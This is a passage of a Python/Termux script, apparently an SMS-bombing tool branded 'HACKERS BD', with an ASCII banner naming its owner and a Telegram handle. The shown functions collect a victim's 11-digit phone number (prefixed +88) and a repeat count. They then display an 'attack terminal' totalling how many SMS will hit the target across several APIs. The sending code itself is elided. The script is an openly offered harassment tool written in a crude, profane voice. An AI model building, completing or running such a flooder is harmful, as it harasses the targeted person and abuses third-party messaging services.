...
║          	   HACKERS ᴮᴰ                        ║
║                                                    ║
║   Owner    : Cyberb Shuvo X                        ║
║   Telegram : @shuvoMichael                         ║
║   Version  : v1.0                                  ║
║   Powered  : Python / Termux                       ║
║                                                    ║
║   "SHUVO DIP SANA CYBER EXPERT"                    ║
╚════════════════════════════════════════════════════╝
    ...
    def get_victim_info(self):
        ...
        while True:
            self.console.print(f"\n[bold {Colors.PRIMARY}]╭─[/bold {Colors.PRIMARY}] [bold]ENTER YOUR FUCKING NUMBER🎭[/bold]")
            number = self.console.input(f"[bold {Colors.PRIMARY}]╰─[/bold {Colors.PRIMARY}] $ ")
            
            if number.isdigit() and len(number) == 11:
                break
            else:
                self.console.print(f"[bold {Colors.ERROR}]✗ MUST BE 11 CHARACTER ⚠️[/bold {Colors.ERROR}]")
                
        while True:
            try:
                self.console.print(f"\n[bold {Colors.PRIMARY}]╭─[/bold {Colors.PRIMARY}] [bold]ENTER FUCK AMMOUNT[/bold]")
                amount = int(self.console.input(f"[bold {Colors.PRIMARY}]╰─[/bold {Colors.PRIMARY}] $ "))
                if amount > 0:
                    break
                else:
                    self.console.print(f"[bold {Colors.ERROR}]✗ DISCLAIMER⚠️:-NOT BE NEGETIVE[/bold {Colors.ERROR}]")
            except ValueError:
                self.console.print(f"[bold {Colors.ERROR}]✗ DISCLAIMER⚠️:-ENTER ONLY REAL NUMBER[/bold {Colors.ERROR}]")
    ...
    def start_attack(self, number, amount):
        ...
        # Display target info
        info_panel = Panel(
            f"[bold {Colors.SECONDARY}]FUCKED:[/bold {Colors.SECONDARY}] [bold]+88{number}[/bold]\n"
            f"[bold {Colors.SECONDARY}]CALLED:[/bold {Colors.SECONDARY}] [bold]{amount}[/bold]\n"
            f"[bold {Colors.SECONDARY}]API PER FUCK:-[/bold {Colors.SECONDARY}] [bold]{self.total_apis}[/bold]\n"
            f"[bold {Colors.SECONDARY}]FULL TARGETS SMS:[/bold {Colors.SECONDARY}] [bold]{amount * self.total_apis}[/bold]",
            title="[bold green]ATTACK TERMINAL BY SHUVO DIP[/bold green]",
            border_style="green",
            width=80
        )
        ...
        summary_panel = Panel(
            f"[bold]TORAL CALL:[/bold] {amount}\n"
            f"[bold]API PER FUCK:[/bold] {self.total_apis}\n"
